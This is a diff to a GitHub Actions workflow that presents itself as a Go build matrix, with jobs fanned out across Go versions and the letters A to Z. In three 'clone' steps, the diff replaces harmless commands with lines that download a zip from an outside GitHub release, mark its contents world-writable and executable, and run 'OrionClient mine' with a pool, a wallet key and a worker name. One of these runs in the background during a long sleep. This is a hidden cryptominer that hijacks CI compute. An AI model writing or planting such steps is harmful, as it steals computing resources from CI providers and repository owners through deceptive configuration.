@@ -12,7 +12,7 @@ jobs:
       matrix:
         go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
         flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
-    timeout-minutes: 15
+    timeout-minutes: 10
     env:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
@@ -25,7 +25,8 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: sleep 2s
+      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
+        sleep 305s
   chat:
     needs: me
     runs-on: ubuntu-latest
@@ -47,7 +48,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: lscpu
+      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1
+        
     
      
   enak:
@@ -71,7 +73,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: lscpu
+      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1
+        
     
   Success:
     needs: [me, chat, enak]
@@ -85,4 +88,3 @@ jobs:
       - name: Success
         if: ${{ success() }}
         run: echo "all don,All Done"
-        
